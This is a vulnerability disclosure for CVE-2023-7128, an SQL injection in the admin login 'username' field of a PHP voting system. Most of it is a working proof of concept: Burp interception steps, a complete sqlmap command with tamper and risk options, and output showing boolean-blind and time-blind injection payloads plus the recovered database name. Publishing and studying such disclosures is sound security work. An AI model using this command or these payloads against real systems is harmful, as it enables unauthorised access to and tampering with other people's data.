# CVE-2023-7128_Voting_System-SQL_Injection-1
+ **Exploit Title:** CVE-2023-7128_Voting_System-SQL_Injection-1
+ **Date:** 2023-23-12
+ **Exploit Author:** Hamdi Sevben
+ **Vendor Homepage:** https://code-projects.org/voting-system-in-php-with-source-code/
+ **Software Link:** https://download-media.code-projects.org/2020/02/VOTING_SYSTEM_IN_PHP_WITH_SOURCE_CODE.zip
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** CVE-2023-7128

## References: 
+ **CVE-2023-7128:** https://vuldb.com/?id.249131
+ https://www.cve.org/CVERecord?id=CVE-2023-7128

## Description:
Voting System 1.0 allows SQL Injection via parameter 'username' in "/votesystem/admin/". Exploiting this issue could allow an attacker to compromise the application, access or modify data,  or exploit latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to the admin login page: "http://localhost/votesystem/admin/"
+ Fill the username and password then click 'Sign In' button.
+ Intercept the request via Burp Suite and send to Repeater.
+ Copy and paste the request to a "r.txt" file.
+ Use sqlmap to exploit. In sqlmap, use 'username' parameter to dump the database. 
```
sqlmap -r r.txt -p username --risk 3 --level 5 --threads 1 --random-agent tamper=between, randomcase --proxy="http://127.0.0.1:8080" --dbms mysql --batch --current-db
```

```
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=test' OR NOT 6416=6416-- SOwv&password=test&login=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 3547 FROM (SELECT(SLEEP(5)))OFWl)-- funY&password=test&login=
---
[18:54:43] [INFO] testing MySQL
[18:54:44] [INFO] confirming MySQL
[18:54:44] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[18:54:44] [INFO] fetching current database
[18:54:44] [INFO] resumed: votesystem
current database: 'votesystem'
```

+ current database: `votesystem`
![1](https://github.com/h4md153v63n/CVEs/assets/5091265/09972f6e-8875-4c94-b64d-3cebf4ff1ab8)
